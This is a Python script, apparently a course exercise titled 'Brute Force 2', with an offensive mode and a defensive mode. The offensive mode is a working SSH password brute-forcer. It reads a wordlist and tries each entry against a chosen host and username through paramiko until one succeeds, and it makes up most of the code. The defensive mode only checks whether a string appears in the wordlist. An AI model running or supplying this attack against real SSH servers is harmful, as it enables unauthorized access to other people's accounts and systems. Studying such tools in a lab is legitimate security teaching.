#!/usr/bin/env python3
# Script Name:                  Brute Force 2
# Author:                       SEYED MEHDI HASHEMI SOHI
# Date of latest revision:      01/30/2024
# Purpose:                      Automated Brute Force Wordlist Attack 1
# Source:                       chatgpt




import time  # Import the time module for managing delays
import paramiko  # Import the Paramiko library for SSH authentication

def ssh_authentication(username, ip_address, password):
    # Function to attempt SSH authentication using Paramiko
    ssh = paramiko.SSHClient()  # Create an SSHClient object
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())  # Automatically add unknown hosts
    try:
        ssh.connect(ip_address, username=username, password=password, timeout=5)  # Attempt SSH connection
        print("Authentication successful!")  # Print success message if authentication is successful
        return True  # Return True to indicate successful authentication
    except paramiko.AuthenticationException:  # Catch AuthenticationException if authentication fails
        print("Authentication failed.")  # Print failure message if authentication fails
        return False  # Return False to indicate authentication failure
    except Exception as e:  # Catch any other exceptions
        print(f"An error occurred: {str(e)}")  # Print the error message
        return False  # Return False to indicate authentication failure
    finally:
        ssh.close()  # Close the SSH connection regardless of the outcome

def offensive_mode(word_list_path, username, ip_address):
    # Function for offensive mode: iterate through word list and attempt SSH authentication for each word
    with open(word_list_path, 'r') as file:  # Open the word list file in read mode
        for word in file:  # Iterate through each word in the file
            password = word.strip()  # Remove leading/trailing whitespaces from the word
            print(f"Trying password: {password}")  # Print the password being attempted
            if ssh_authentication(username, ip_address, password):  # Attempt SSH authentication
                return  # Exit the function if authentication is successful

def defensive_mode(user_input, word_list_path):
    # Function for defensive mode: check if provided password is in the word list
    with open(word_list_path, 'r') as file:  # Open the word list file in read mode
        word_list = [line.strip() for line in file]  # Create a list of words from the file
        if user_input in word_list:  # Check if the user input exists in the word list
            print("Password recognized!")  # Print recognition message if password is found
        else:
            print("Password not recognized.")  # Print rejection message if password is not found

def main():
    # Main function to drive the program
    mode = int(input("Select mode (1 for Offensive, 2 for Defensive): "))  # Prompt user to select mode
    if mode == 1:  # If mode is offensive
        word_list_path = input("Enter word list file path: ")  # Get word list file path from user
        username = input("Enter username: ")  # Get username from user
        ip_address = input("Enter IP address: ")  # Get IP address from user
        offensive_mode(word_list_path, username, ip_address)  # Call offensive mode function
    elif mode == 2:  # If mode is defensive
        user_input = input("Enter a string to search in the word list: ")  # Get user input for search
        word_list_path = input("Enter word list file path: ")  # Get word list file path from user
        defensive_mode(user_input, word_list_path)  # Call defensive mode function
    else:
        print("Invalid mode selection.")  # Print message for invalid mode selection

if __name__ == "__main__":
    main()  # Call the main function when the script is executed directly
